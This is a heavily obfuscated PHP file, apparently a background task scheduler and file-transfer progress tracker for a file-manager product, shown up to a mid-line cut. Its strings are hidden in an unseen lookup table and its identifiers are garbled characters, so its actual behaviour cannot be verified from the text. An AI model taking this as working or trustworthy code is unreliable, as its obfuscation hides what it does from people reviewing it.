<?php
 goto cñÂ„“É; E§é†Ö–Ë¯: class AutoTask { public static function start() { goto cªÍçÓïŠµ; cªÍçÓïŠµ: $A×˜ÛÅİôä =& $_SERVER[úÎü]; if (self::valueGet($A×˜ÛÅİôä[690]) != $A×˜ÛÅİôä[83]) { return; } if (self::valueGet($A×˜ÛÅİôä[1448]) == $A×˜ÛÅİôä[83]) { $eèñÃ˜± = self::valueGet($A×˜ÛÅİôä[1449]); if (time() - $eèñÃ˜± > 3600 * 2) { self::restart(); } return; } goto C´¤Ú¹æŠ; cì¤øß›…È: while (!0) { self::cacheClear(); if (self::valueGet($A×˜ÛÅİôä[690]) != $A×˜ÛÅİôä[83]) { self::valueSet($A×˜ÛÅİôä[1448], $A×˜ÛÅİôä[485]); self::log($A×˜ÛÅİôä[1452]); die; } self::valueSet($A×˜ÛÅİôä[1448], $A×˜ÛÅİôä[83]); self::valueSet($A×˜ÛÅİôä[1449], time()); self::taskRunAll(); sleep(self::valueGet($A×˜ÛÅİôä[1453])); } goto FÀÏî˜ò‘Ç; C´¤Ú¹æŠ: http_close(); self::valueSet($A×˜ÛÅİôä[1448], $A×˜ÛÅİôä[83]); Hook::bind($A×˜ÛÅİôä[1450], $A×˜ÛÅİôä[1451]); goto cì¤øß›…È; FÀÏî˜ò‘Ç: } public static function restart() { $D—…ªÍ´Ì =& $_SERVER[úÎü]; http_close(); self::valueSet($D—…ªÍ´Ì[690], $D—…ªÍ´Ì[485]); sleep(self::valueGet($D—…ªÍ´Ì[1453]) + 5); self::valueSet($D—…ªÍ´Ì[1448], $D—…ªÍ´Ì[485]); self::valueSet($D—…ªÍ´Ì[690], $D—…ªÍ´Ì[83]); } public static function shutdownEvent() { $Bõš¶²°¯ =& $_SERVER[úÎü]; self::valueSet($Bõš¶²°¯[1448], $Bõš¶²°¯[485]); self::log($Bõš¶²°¯[1454]); } public static function config($f‘ƒõÁÜ”, $DÄø—âŸÒ) { $CÚĞŒ–°ÀŞ =& $_SERVER[úÎü]; $DîÍÏš’Ğ› = 10; $DÄø—âŸÒ = intval($DÄø—âŸÒ) <= $DîÍÏš’Ğ› ? $DîÍÏš’Ğ› : intval($DÄø—âŸÒ); self::valueSet($CÚĞŒ–°ÀŞ[690], $f‘ƒõÁÜ”); self::valueSet($CÚĞŒ–°ÀŞ[1453], $DÄø—âŸÒ); } private static function taskRunAll() { goto BÌ—Ã§®äè; DÌ’ƒ¸áËÊ: self::taskQueueRun($F‚ùŠŒ¼†‡); self::closeDatabase(); goto BóƒŒ”ÕšŞ; EÃÜ¥äÚøà: $AßÀˆ²´ÈÖ = count($dÈ°ä¡¬Ê¸); for ($aééÏÎß–¿ = 0; $aééÏÎß–¿ < $AßÀˆ²´ÈÖ; $aééÏÎß–¿++) { $BĞê¹Ö¤Ò± = $dÈ°ä¡¬Ê¸[$aééÏÎß–¿]; if (!$BĞê¹Ö¤Ò±[$e¾‚ˆé²â‹[383]] || $BĞê¹Ö¤Ò±[$e¾‚ˆé²â‹[1456]] != $e¾‚ˆé²â‹[83]) { continue; } if (!self::taskTimeCheck($BĞê¹Ö¤Ò±)) { continue; } self::taskRun($BĞê¹Ö¤Ò±); } Hook::trigger($e¾‚ˆé²â‹[1457]); goto DÌ’ƒ¸áËÊ; BÌ—Ã§®äè: $e¾‚ˆé²â‹ =& $_SERVER[úÎü]; $F‚ùŠŒ¼†‡ = timeFloat(); $dÈ°ä¡¬Ê¸ = Model($e¾‚ˆé²â‹[1455])->listData(); goto EÃÜ¥äÚøà; BóƒŒ”ÕšŞ: } private static function taskQueueRun($cäñ¦‚ˆØ) { $Dîãˆ©Ğ²Ä = 10; while (!0) { $CŠëõ‰œæ = TaskQueue::run(); if ($CŠëõ‰œæ === !1) { break; } if (timeFloat() - $cäñ¦‚ˆØ >= $Dîãˆ©Ğ²Ä) { break; } } } private static function taskTimeCheck($DÚÉ÷ªöªÆ) { goto fÅÀ‰­äğË; b£‘—è°ñ•: $E‰‰ ™óÂ‚ = strtotime($a¼”ù¯ØŸ©[1458] . $BƒĞáå¿Ë[$a¼”ù¯ØŸ©[1459]] . $a¼”ù¯ØŸ©[1460]) - strtotime($a¼”ù¯ØŸ©[1461]); $Aºä†â‚» = time() - strtotime(date($a¼”ù¯ØŸ©[1462]) . $a¼”ù¯ØŸ©[1463]); $FõÖº²¨åî = $Aºä†â‚» >= $E‰‰ ™óÂ‚ && $Aºä†â‚» <= $E‰‰ ™óÂ‚ + 3600; goto f‚¦‰‹ÃÁš; fÅÀ‰­äğË: $a¼”ù¯ØŸ© =& $_SERVER[úÎü]; $BƒĞáå¿Ë = json_decode($DÚÉ÷ªöªÆ[$a¼”ù¯ØŸ©[193]], !0); $C°ÌÁÄ¨’  = intval($DÚÉ÷ªöªÆ[$a¼”ù¯ØŸ©[1449]]); goto b£‘—è°ñ•; f‚¦‰‹ÃÁš: switch ($BƒĞáå¿Ë[$a¼”ù¯ØŸ©[29]]) { case $a¼”ù¯ØŸ©[1464]: if (time() - $C°ÌÁÄ¨’  < 3600 * 24 * 30) { return !1; } if ($BƒĞáå¿Ë[$a¼”ù¯ØŸ©[1464]] == date($a¼”ù¯ØŸ©[1465]) && $FõÖº²¨åî) { return !0; } break; case $a¼”ù¯ØŸ©[1466]: if (time() - $C°ÌÁÄ¨’  < 3600 * 24 * 7) { return !1; } $F†ƒé¨‹•  = date($a¼”ù¯ØŸ©[1467]) == 0 ? 7 : date($a¼”ù¯ØŸ©[1467]); if ($BƒĞáå¿Ë[$a¼”ù¯ØŸ©[1466]] == $F†ƒé¨‹•  && $FõÖº²¨åî) { return !0; } break; case $a¼”ù¯ØŸ©[1459]: if (time() - $C°ÌÁÄ¨’  < 3600 * 24) { return !1; } if ($FõÖº²¨åî) { return !0; } break; case $a¼”ù¯ØŸ©[1468]: if (time() - $C°ÌÁÄ¨’  >= floatval($BƒĞáå¿Ë[$a¼”ù¯ØŸ©[1468]]) * 60) { return !0; } break; default: break; } return !1; goto e•¬ˆé–¡; e•¬ˆé–¡: } private static function closeDatabase() { goto CÍâÚ·íš; d‹É¼¼„ õ: if (!$fõ†ÒËáÅÀ) { $fõ†ÒËáÅÀ = time(); } if (time() - $fõ†ÒËáÅÀ < $e¾‰‹Ì“©½) { return; } $fõ†ÒËáÅÀ = time(); goto C¶…Ã¢éå¿; C¶…Ã¢éå¿: $EÆ›Ÿ–Ó¢‘ = Model($Aä¢²Ú×ç†[491])->db($Aä¢²Ú×ç†[33]); if ($EÆ›Ÿ–Ó¢‘) { $EÆ›Ÿ–Ó¢‘->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Aä¢²Ú×ç†[1469], $Aä¢²Ú×ç†[1470]); die; } goto D‚¨âÄ¿Â; CÍâÚ·íš: $Aä¢²Ú×ç† =& $_SERVER[úÎü]; static $fõ†ÒËáÅÀ = 0; $e¾‰‹Ì“©½ = 1800; goto d‹É¼¼„ õ; D‚¨âÄ¿Â: } public static function taskRun($eÒ»ìŠ”é¨) { goto dÜç‹çŒ„¼; dÜç‹çŒ„¼: $EÓå ¹êŒ· =& $_SERVER[úÎü]; self::log($EÓå ¹êŒ·[1471] . $eÒ»ìŠ”é¨[$EÓå ¹êŒ·[383]] . $EÓå ¹êŒ·[1472] . $eÒ»ìŠ”é¨[$EÓå ¹êŒ·[28]] . $EÓå ¹êŒ·[1473] . $eÒ»ìŠ”é¨[$EÓå ¹êŒ·[1474]]); Model($EÓå ¹êŒ·[1455])->run($eÒ»ìŠ”é¨[$EÓå ¹êŒ·[383]]); goto aë¾é¦öŞË; aë¾é¦öŞË: $F¾·ÏÇ‰’Ô = timeFloat(); $CìÇ¸°Ç¹õ = $EÓå ¹êŒ·[33]; switch ($eÒ»ìŠ”é¨[$EÓå ¹êŒ·[29]]) { case $EÓå ¹êŒ·[301]: $C™êéáíÇ = url_request($eÒ»ìŠ”é¨[$EÓå ¹êŒ·[1474]], $EÓå ¹êŒ·[224], !1, !1, !1, !1, 5); $CìÇ¸°Ç¹õ = strlen($C™êéáíÇ); break; case $EÓå ¹êŒ·[223]: $CìÇ¸°Ç¹õ = Hook::apply($eÒ»ìŠ”é¨[$EÓå ¹êŒ·[1474]]); default: break; } goto fÌ±³ÖÆòï; fÌ±³ÖÆòï: Model($EÓå ¹êŒ·[1475])->add(array($EÓå ¹êŒ·[1476] => $EÓå ¹êŒ·[33], $EÓå ¹êŒ·[1477] => $EÓå ¹êŒ·[485], $EÓå ¹êŒ·[29] => $EÓå ¹êŒ·[1478] . $eÒ»ìŠ”é¨[$EÓå ¹êŒ·[383]], $EÓå ¹êŒ·[1479] => json_encode(array($EÓå ¹êŒ·[28] => $eÒ»ìŠ”é¨[$EÓå ¹êŒ·[28]], $EÓå ¹êŒ·[1480] => timeFloat() - $F¾·ÏÇ‰’Ô, $EÓå ¹êŒ·[287] => $CìÇ¸°Ç¹õ)))); self::log($EÓå ¹êŒ·[1481] . $eÒ»ìŠ”é¨[$EÓå ¹êŒ·[383]] . $EÓå ¹êŒ·[1482] . $CìÇ¸°Ç¹õ); return !0; goto C¤Ÿ›Û½å˜; C¤Ÿ›Û½å˜: } private static function valueGet($cÈ±Õ¦êˆÕ) { $D«¶Ññà­Â =& $_SERVER[úÎü]; $f©ò‚àå± = $D«¶Ññà­Â[1483]; $d˜Š†Å”°“ = Model($D«¶Ññà­Â[1484])->get($cÈ±Õ¦êˆÕ, $f©ò‚àå±); if (is_null($d˜Š†Å”°“)) { Model($D«¶Ññà­Â[1484])->set($D«¶Ññà­Â[1453], 10, $f©ò‚àå±); Model($D«¶Ññà­Â[1484])->set($D«¶Ññà­Â[690], $D«¶Ññà­Â[83], $f©ò‚àå±); Model($D«¶Ññà­Â[1484])->set($D«¶Ññà­Â[1448], $D«¶Ññà­Â[485], $f©ò‚àå±); $d˜Š†Å”°“ = Model($D«¶Ññà­Â[1484])->get($cÈ±Õ¦êˆÕ, $f©ò‚àå±); } return $d˜Š†Å”°“; } private static function valueSet($Aœáò³ÄÇ­, $AæÂÀÎ—) { $d”ÌÁÈ„Øë =& $_SERVER[úÎü]; return Model($d”ÌÁÈ„Øë[1484])->set($Aœáò³ÄÇ­, $AæÂÀÎ—, $d”ÌÁÈ„Øë[1483]); } protected static function log($f¸£­ßºÚ) { write_log($f¸£­ßºÚ, $_SERVER[úÎü][1470]); } private static function cacheClear() { $bŠ³½’ÍÎ¸ =& $_SERVER[úÎü]; $D—’¯ÎùÄ = Model($bŠ³½’ÍÎ¸[1484])->cacheKey($bŠ³½’ÍÎ¸[1483]); Cache::clearMemory($D—’¯ÎùÄ); Model($bŠ³½’ÍÎ¸[1455])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($DÍßôË‚Ö, $eíë•Õ Ç = '', $A”ÌâÌ ½ = 0, $FñÏà°»÷Ş = '') { goto cÎ»‡ Äƒ’; e¶ÄÕØŒêĞ: $GLOBALS[$B¤˜ÇÓÎ¸‰[1493]] = 1; Hook::bind($B¤˜ÇÓÎ¸‰[1450], array($this, $B¤˜ÇÓÎ¸‰[1494])); Hook::bind($B¤˜ÇÓÎ¸‰[1495], array($this, $B¤˜ÇÓÎ¸‰[1496])); goto BÛÁ¥Ô ©Ä; cÎ»‡ Äƒ’: $B¤˜ÇÓÎ¸‰ =& $_SERVER[úÎü]; if (self::get($DÍßôË‚Ö)) { return; } $this->task = array($B¤˜ÇÓÎ¸‰[383] => $DÍßôË‚Ö, $B¤˜ÇÓÎ¸‰[1485] => USER_ID, $B¤˜ÇÓÎ¸‰[1387] => $FñÏà°»÷Ş, $B¤˜ÇÓÎ¸‰[29] => $eíë•Õ Ç, $B¤˜ÇÓÎ¸‰[984] => $B¤˜ÇÓÎ¸‰[33], $B¤˜ÇÓÎ¸‰[982] => $A”ÌâÌ ½, $B¤˜ÇÓÎ¸‰[996] => 0, $B¤˜ÇÓÎ¸‰[1486] => 0, $B¤˜ÇÓÎ¸‰[1487] => 0, $B¤˜ÇÓÎ¸‰[1488] => timeFloat(), $B¤˜ÇÓÎ¸‰[1489] => 0, $B¤˜ÇÓÎ¸‰[1490] => 0, $B¤˜ÇÓÎ¸‰[1491] => 0, $B¤˜ÇÓÎ¸‰[1492] => 0, $B¤˜ÇÓÎ¸‰[690] => $B¤˜ÇÓÎ¸‰[1448]); goto e¶ÄÕØŒêĞ; BÛÁ¥Ô ©Ä: $this->startAfter(); Hook::trigger($B¤˜ÇÓÎ¸‰[1497], $this->task); $this->task[$B¤˜ÇÓÎ¸‰[1490]] = timeFloat(); goto C‡™çÙğÛ; C‡™çÙğÛ: } public function end() { goto EöóÓ¯¿„é; EöóÓ¯¿„é: $f‹Ôá¥–˜› =& $_SERVER[úÎü]; if (!$this->task) { return; } if ($this->task[$f‹Ôá¥–˜›[1490]]) { self::valueSet($this->task[$f‹Ôá¥–˜›[383]], !1); } goto B³íàå¸ß’; B³íàå¸ß’: $EË¹óÙ‘ï = timeFloat() - $this->task[$f‹Ôá¥–˜›[1488]]; self::log($f‹Ôá¥–˜›[1498] . $this->task[$f‹Ôá¥–˜›[383]] . $f‹Ôá¥–˜›[1499] . $EË¹óÙ‘ï . $f‹Ôá¥–˜›[1500]); Hook::unbind($f‹Ôá¥–˜›[1450], array($this, $f‹Ôá¥–˜›[1494])); goto aŞŠ»Ù¾Ì²; aŞŠ»Ù¾Ì²: Hook::unbind($f‹Ôá¥–˜›[1495], array($this, $f‹Ôá¥–˜›[1496])); $this->endAfter(); $this->task = !1; goto Eª˜ï²¶¥´; Eª˜ï²¶¥´: } public function update($FĞ©…ÜÙ©ä = 0, $a§ê¦ÑŒ¬ = false) { goto C“Ñé‡¤¢™; C—ƒï³­Ø›: $AÍéˆ¹ÍÛ = self::get($C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[383]]); $Eò¡ßÈ‚ğ´ = $AÍéˆ¹ÍÛ[$bœ“ë…©æÄ[690]]; if ($Eò¡ßÈ‚ğ´ == self::STATYS_KILL) { $DÁîàì« = array($bœ“ë…©æÄ[1501] => LNG($bœ“ë…©æÄ[1502]), $bœ“ë…©æÄ[1046] => !1); Cache::set($bœ“ë…©æÄ[1503] . $this->task[$bœ“ë…©æÄ[383]], $DÁîàì«, 30); $this->end(); die; } else { if ($Eò¡ßÈ‚ğ´ == self::STATYS_STOP) { $f›è—ÓŞ¾§ = 2; $AÍéˆ¹ÍÛ[$bœ“ë…©æÄ[1491]] += $f›è—ÓŞ¾§; self::valueSet($C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[383]], $AÍéˆ¹ÍÛ); sleep($f›è—ÓŞ¾§); $this->update(); return; } } goto Dô†ÍÈ¦Èé; f®Ò†”ì¤É: Hook::trigger($bœ“ë…©æÄ[1504], $C”Ş£·ÏÕ‡); self::valueSet($C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[383]], $C”Ş£·ÏÕ‡); goto f±İ¨Ï±®¾; cš½¢ë³“Ä: $this->updateAfter(); $Bóğù©´ó” = 0.2; if (timeFloat() - $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1490]] < $Bóğù©´ó” && !$a§ê¦ÑŒ¬) { return; } goto C—ƒï³­Ø›; Dô†ÍÈ¦Èé: $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[690]] = $Eò¡ßÈ‚ğ´ ? $Eò¡ßÈ‚ğ´ : $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[690]]; $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1491]] = $AÍéˆ¹ÍÛ[$bœ“ë…©æÄ[1491]] ? $AÍéˆ¹ÍÛ[$bœ“ë…©æÄ[1491]] : 0; $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1490]] = timeFloat(); goto f®Ò†”ì¤É; C“Ñé‡¤¢™: $bœ“ë…©æÄ =& $_SERVER[úÎü]; $C”Ş£·ÏÕ‡ =& $this->task; if (!$C”Ş£·ÏÕ‡) { return; } goto D¸ÅÃİà¬…; D¸ÅÃİà¬…: $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[996]] += $FĞ©…ÜÙ©ä; $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1489]] = timeFloat(); if ($C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[982]]) { if ($C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[982]] < $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[996]]) { $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[982]] = $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[996]]; } $Eß§‚Ş‘§› = timeFloat() - $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1488]] - $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1491]]; $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1486]] = $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[996]] / $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[982]]; $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1487]] = $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[996]] / $Eß§‚Ş‘§›; if ($C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1486]] > 0) { $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1492]] = $Eß§‚Ş‘§› * (1 - $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1486]]) / $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1486]]; } $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1492]] = $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1492]] <= 0 ? 0 : $C”Ş£·ÏÕ‡[$bœ“ë…©æÄ[1492]]; } goto cš½¢ë³“Ä; f±İ¨Ï±®¾: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($EÅáºÓÚ‰Ô) { $A‘„ôÈÑî =& $_SERVER[úÎü]; Cache::set($A‘„ôÈÑî[1503] . $this->task[$A‘„ôÈÑî[383]], $EÅáºÓÚ‰Ô, 60); return $EÅáºÓÚ‰Ô; } public static function get($d ÕØâÙÕ‚) { return self::valueGet($d ÕØâÙÕ‚); } public static function listData() { $cóÑ»²î¬« = self::valueGet(); return array_sort_by($cóÑ»²î¬«, $_SERVER[úÎü][1488], !0); } public static function kill($C”ïÅù—Â¨) { return self::changeStatus($C”ïÅù—Â¨, self::STATYS_KILL); } public static function stop($Fä‘¥‹ˆƒô) { return self::changeStatus($Fä‘¥‹ˆƒô, self::STATYS_STOP); } public static function restart($eğöœ˜”àö) { return self::changeStatus($eğöœ˜”àö, self::STATYS_RUNNING); } public static function killAll() { $EŸ¸Ô‹à›¢ =& $_SERVER[úÎü]; $e‹Øœß±Æ£ = self::listData(); foreach ($e‹Øœß±Æ£ as $DÊ©”ªİÆò) { self::kill($DÊ©”ªİÆò[$EŸ¸Ô‹à›¢[383]]); } sleep(2); foreach ($e‹Øœß±Æ£ as $DÊ©”ªİÆò) { self::valueSet($DÊ©”ªİÆò[$EŸ¸Ô‹à›¢[383]], !1); } } private static function changeStatus($d«ŞÍåè“Œ, $b¶„â¶‡Šš) { goto C–ğŒ‡êåò; E—ò—İßáÕ: return !0; goto cÍ¡õ¸Í‰Œ; b‰ã›æ‚ã…: $aÃÔ¡ÇÄ¦[$E‹›é§‰âÂ[690]] = $b¶„â¶‡Šš; self::valueSet($d«ŞÍåè“Œ, $aÃÔ¡ÇÄ¦); self::log($E‹›é§‰âÂ[1505] . $aÃÔ¡ÇÄ¦[$E‹›é§‰âÂ[383]] . $E‹›é§‰âÂ[1506] . $b¶„â¶‡Šš); goto E—ò—İßáÕ; C–ğŒ‡êåò: $E‹›é§‰âÂ =& $_SERVER[úÎü]; $aÃÔ¡ÇÄ¦ = self::valueGet($d«ŞÍåè“Œ); if (!$aÃÔ¡ÇÄ¦) { return !1; } goto b‰ã›æ‚ã…; cÍ¡õ¸Í‰Œ: } public static function valueGet($E˜˜¨ª¡ÄÆ = false) { $eÏšòˆåç‰ =& $_SERVER[úÎü]; if ($E˜˜¨ª¡ÄÆ) { $bß©¶”ÁáŒ = Model($eÏšòˆåç‰[415])->where(array($eÏšòˆåç‰[89] => $E˜˜¨ª¡ÄÆ, $eÏšòˆåç‰[29] => $eÏšòˆåç‰[1507]))->find(); return $bß©¶”ÁáŒ ? json_decode($bß©¶”ÁáŒ[$eÏšòˆåç‰[366]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($F­²ÉÄ£½° = false) { goto D†Ÿ·”èÍ; Eï”¼İ˜¿: return $B‹’Í™¼Ğ‰; goto FÑîŒÔˆ; bß–¶åë: $B‹’Í™¼Ğ‰ = Model($cÆ”Ä÷åÕË[415])->where($A¶Ñæù„Ó³)->select(); $B‹’Í™¼Ğ‰ = $B‹’Í™¼Ğ‰ ? $B‹’Í™¼Ğ‰ : array(); foreach ($B‹’Í™¼Ğ‰ as $Aƒ·…½ù => $C¯‹ƒ‡„ñï) { $B‹’Í™¼Ğ‰[$Aƒ·…½ù] = json_decode($C¯‹ƒ‡„ñï[$cÆ”Ä÷åÕË[366]], !0); } goto Eï”¼İ˜¿; D†Ÿ·”èÍ: $cÆ”Ä÷åÕË =& $_SERVER[úÎü]; $A¶Ñæù„Ó³ = array($cÆ”Ä÷åÕË[29] => $cÆ”Ä÷åÕË[1507]); if ($F­²ÉÄ£½°) { $A¶Ñæù„Ó³[$cÆ”Ä÷åÕË[1485]] = $F­²ÉÄ£½°; } goto bß–¶åë; FÑîŒÔˆ: } public static function valueSet($D¾Òï†æí, $d–¬ôµÕ›) { goto EÕË×Ÿ±Ê¤; EÕË×Ÿ±Ê¤: $E– Ä¢³¹Ê =& $_SERVER[úÎü]; if (!$d–¬ôµÕ›) { return Model($E– Ä¢³¹Ê[415])->where(array($E– Ä¢³¹Ê[89] => $D¾Òï†æí, $E– Ä¢³¹Ê[29] => $E– Ä¢³¹Ê[1507]))->delete(); } $FĞ®…Ş‹Œà = json_encode($d–¬ôµÕ›); goto d•¯†ïŒë©; bÏáá ½—: Model($E– Ä¢³¹Ê[415])->add($B×“µ®°ì‚, array(), !0); goto D¥»¦œØ; d•¯†ïŒë©: if (!$FĞ®…Ş‹Œà) { ob_start(); var_dump($d–¬ôµÕ›); $Cª¸‰²‚­ = ob_get_clean(); self::log($E– Ä¢³¹Ê[1508] . json_encode_force($Cª¸‰²‚­)); } if (!$D¾Òï†æí || !$d–¬ôµÕ›[$E– Ä¢³¹Ê[383]]) { return !1; } $B×“µ®°ì‚ = array($E– Ä¢³¹Ê[29] => $E– Ä¢³¹Ê[1507], $E– Ä¢³¹Ê[1485] => USER_ID, $E– Ä¢³¹Ê[89] => $D¾Òï†æí, $E– Ä¢³¹Ê[366] => $FĞ®…Ş‹Œà); goto bÏáá ½—; D¥»¦œØ: } public static function log($E÷Ù–éŸíÙ) { write_log($E÷Ù–éŸíÙ, $_SERVER[úÎü][1509]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto AŠˆÚ—; EˆÇƒ«§·¸: Hook::bind($AË˜Ìšœ÷„[555], array($this, $AË˜Ìšœ÷„[1515])); Hook::bind($AË˜Ìšœ÷„[556], array($this, $AË˜Ìšœ÷„[1516])); Hook::bind($AË˜Ìšœ÷„[558], array($this, $AË˜Ìšœ÷„[1517])); goto Aİ„»•ÉÒ—; dŞˆ¿Èƒ£ä: Hook::bind($AË˜Ìšœ÷„[528], array($this, $AË˜Ìšœ÷„[1518])); Hook::bind($AË˜Ìšœ÷„[530], array($this, $AË˜Ìšœ÷„[1518])); Hook::bind($AË˜Ìšœ÷„[532], array($this, $AË˜Ìšœ÷„[1518])); goto a ¤ˆíˆ Ñ; aô÷”í™Á¸: Hook::bind($AË˜Ìšœ÷„[1522], array($this, $AË˜Ìšœ÷„[1523])); Hook::bind($AË˜Ìšœ÷„[1524], array($this, $AË˜Ìšœ÷„[1525])); Hook::bind($AË˜Ìšœ÷„[1526], array($this, $AË˜Ìšœ÷„[1527])); goto A¯Î÷õŒÕê; a ¤ˆíˆ Ñ: Hook::bind($AË˜Ìšœ÷„[1519], array($this, $AË˜Ìšœ÷„[1520])); Hook::bind($AË˜Ìšœ÷„[548], array($this, $AË˜Ìšœ÷„[1521])); $this->sourceModelCopyFlag = !1; goto aô÷”í™Á¸; Aİ„»•ÉÒ—: Hook::bind($AË˜Ìšœ÷„[559], array($this, $AË˜Ìšœ÷„[1517])); Hook::bind($AË˜Ìšœ÷„[526], array($this, $AË˜Ìšœ÷„[1518])); Hook::bind($AË˜Ìšœ÷„[523], array($this, $AË˜Ìšœ÷„[1518])); goto dŞˆ¿Èƒ£ä; AŠˆÚ—: $AË˜Ìšœ÷„ =& $_SERVER[úÎü]; $c¸ç¶ù¦áö =& $this->task; $this->sourceCopyFolder = !1; goto f¤èƒ…³‚•; A¯Î÷õŒÕê: $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1528]] = LNG($AË˜Ìšœ÷„[1529]); $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1530]] = 0; $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1531]] = 0; goto dôµª¹‹¼õ; f¤èƒ…³‚•: Hook::bind($AË˜Ìšœ÷„[1510], array($this, $AË˜Ìšœ÷„[1511])); Hook::bind($AË˜Ìšœ÷„[1068], array($this, $AË˜Ìšœ÷„[1512])); Hook::bind($AË˜Ìšœ÷„[1513], array($this, $AË˜Ìšœ÷„[1514])); goto EˆÇƒ«§·¸; EÆã¼ö”ÛØ: $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1534]] = 0; $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1535]] = 0; if (!$c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1387]]) { $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1387]] = LNG($AË˜Ìšœ÷„[1536]); } goto DîïÆ®³Ì™; dôµª¹‹¼õ: $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[984]] = $AË˜Ìšœ÷„[33]; $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1532]] = $AË˜Ìšœ÷„[33]; $c¸ç¶ù¦áö[$AË˜Ìšœ÷„[1533]] = 0; goto EÆã¼ö”ÛØ; DîïÆ®³Ì™: } protected function endAfter() { goto céÉÏå°§½; B½”Ş½İÅß: Hook::unbind($e™«·À®[1522], array($this, $e™«·À®[1523])); Hook::unbind($e™«·À®[1524], array($this, $e™«·À®[1525])); Hook::unbind($e™«·À®[1526], array($this, $e™«·À®[1527])); goto b¯·£­ˆÎí; céÉÏå°§½: $e™«·À® =& $_SERVER[úÎü]; Hook::unbind($e™«·À®[1510], array($this, $e™«·À®[1511])); Hook::unbind($e™«·À®[1068], array($this, $e™«·À®[1512])); goto AÒ‡‘ ¶¿«; C¥Ú°óæÅí: Hook::unbind($e™«·À®[532], array($this, $e™«·À®[1518])); Hook::unbind($e™«·À®[1519], array($this, $e™«·À®[1520])); Hook::unbind($e™«·À®[548], array($this, $e™«·À®[1521])); goto B½”Ş½İÅß; AÒ‡‘ ¶¿«: Hook::unbind($e™«·À®[1513], array($this, $e™«·À®[1514])); Hook::unbind($e™«·À®[555], array($this, $e™«·À®[1515])); Hook::unbind($e™«·À®[556], array($this, $e™«·À®[1516])); goto Fº‡¯¼­†Ò; Fº‡¯¼­†Ò: Hook::unbind($e™«·À®[558], array($this, $e™«·À®[1517])); Hook::unbind($e™«·À®[559], array($this, $e™«·À®[1517])); Hook::unbind($e™«·À®[526], array($this, $e™«·À®[1518])); goto aÊ‡âÉ÷œø; aÊ‡âÉ÷œø: Hook::unbind($e™«·À®[523], array($this, $e™«·À®[1518])); Hook::unbind($e™«·À®[528], array($this, $e™«·À®[1518])); Hook::unbind($e™«·À®[530], array($this, $e™«·À®[1518])); goto C¥Ú°óæÅí; b¯·£­ˆÎí: } public function copyMoveStart($C©‡ÆïºŞ, $EğîâƒˆïÍ, $c¡Ê¼×ƒ¸Ñ, $Fœ®›Ã‹µ¤) { goto F‰ğŒÏ; CËá¥†ˆ†ò: if (substr($EğîâƒˆïÍ, 0, strlen($Eî¿£ŠĞÊ)) == $Eî¿£ŠĞÊ) { return; } if (substr($Fœ®›Ã‹µ¤, 0, strlen($Eî¿£ŠĞÊ)) == $Eî¿£ŠĞÊ) { return; } $AÂîÎÉßÃ· =& $this->task; goto a–“§‚°–ˆ; a–“§‚°–ˆ: $AÂîÎÉßÃ·[$b¯à¤¨‚Ôİ[1538]] = KodIO::transferType($C©‡ÆïºŞ, $c¡Ê¼×ƒ¸Ñ); $this->update(); goto Eñ½ÃÅ¹Ÿ—; F‰ğŒÏ: $b¯à¤¨‚Ôİ =& $_SERVER[úÎü]; self::log($b¯à¤¨‚Ôİ[1537] . $EğîâƒˆïÍ . $b¯à¤¨‚Ôİ[66] . $Fœ®›Ã‹µ¤); $Eî¿£ŠĞÊ = rtrim(TEMP_FILES, $b¯à¤¨‚Ôİ[8]); goto CËá¥†ˆ†ò; Eñ½ÃÅ¹Ÿ—: } public function updateAfter() { goto C¦ŒƒÏƒÅ˜; C¦ŒƒÏƒÅ˜: $Aá’ê–Ğ„‡ =& $_SERVER[úÎü]; $e¤¤Ş¨«Å =& $this->task; if (!$e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[699]]) { return; } goto cœ‰½ğµ°š; cß‚—®¾¸•: $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1486]] = $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1535]] / 